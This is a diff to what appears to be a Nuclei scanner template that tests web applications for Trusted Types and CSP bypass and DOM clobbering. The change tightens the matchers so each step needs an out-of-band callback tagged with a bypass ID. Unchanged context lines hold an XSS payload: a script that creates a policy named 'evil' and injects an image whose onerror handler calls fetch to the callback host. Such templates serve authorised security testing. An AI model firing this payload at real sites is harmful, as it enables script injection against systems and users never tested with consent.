@@ -75,6 +75,7 @@ http:
         "bypass_csp": true
       }
 
+    matchers-condition: and
     matchers:
       - type: word
         part: interactsh_protocol
@@ -82,6 +83,10 @@ http:
           - "http"
           - "dns"
         condition: or
+      - type: word
+        part: interactsh_request
+        words:
+          - "bypass-{{bypass_id}}"
 
   - method: PUT
     path:
@@ -103,22 +108,18 @@ http:
         "validation_callback": "{{callback_url}}/policy-{{bypass_id}}"
       }
 
-    matchers-condition: or
+    matchers-condition: and
     matchers:
-      - type: word
-        part: body
-        words:
-          - "policy created"
-          - "trusted types configured"
-          - "bypass successful"
-        condition: or
-        case-insensitive: true
-
       - type: word
         part: interactsh_protocol
         words:
           - "http"
-        condition: and
+          - "dns"
+        condition: or
+      - type: word
+        part: interactsh_request
+        words:
+          - "policy-{{bypass_id}}"
 
   - method: PATCH
     path:
@@ -136,12 +137,18 @@ http:
         "bypass_verification": true
       }
 
+    matchers-condition: and
     matchers:
       - type: word
         part: interactsh_protocol
         words:
           - "http"
-        condition: and
+          - "dns"
+        condition: or
+      - type: word
+        part: interactsh_request
+        words:
+          - "clobbered-{{bypass_id}}"
 
   - method: POST
     path:
@@ -153,12 +160,19 @@ http:
 
     body: "content={{clobbering_payload}}<script>try{if(trustedTypes.createPolicy){var malicious=trustedTypes.createPolicy('evil',{createHTML:x=>x+'<img src=x onerror=fetch(\"{{callback_url}}/tt-bypass-{{bypass_id}}\")'});document.body.innerHTML=malicious.createHTML('PWNED')}}catch(e){fetch('{{callback_url}}/error-{{bypass_id}}', {method:'POST', body:JSON.stringify({error:e.message})})}</script>&bypass_trusted_types=true"
 
+    matchers-condition: and
     matchers:
       - type: word
         part: interactsh_protocol
         words:
           - "http"
           - "dns"
+        condition: or
+      - type: word
+        part: interactsh_request
+        words:
+          - "tt-bypass-{{bypass_id}}"
+          - "error-{{bypass_id}}"
         condition: or
 
   - method: POST
@@ -178,12 +192,18 @@ http:
         "callback_url": "{{callback_url}}/template-{{bypass_id}}"
       }
 
+    matchers-condition: and
     matchers:
       - type: word
         part: interactsh_protocol
         words:
           - "http"
-        condition: and
+          - "dns"
+        condition: or
+      - type: word
+        part: interactsh_request
+        words:
+          - "object-{{bypass_id}}"
 
     extractors:
       - type: regex
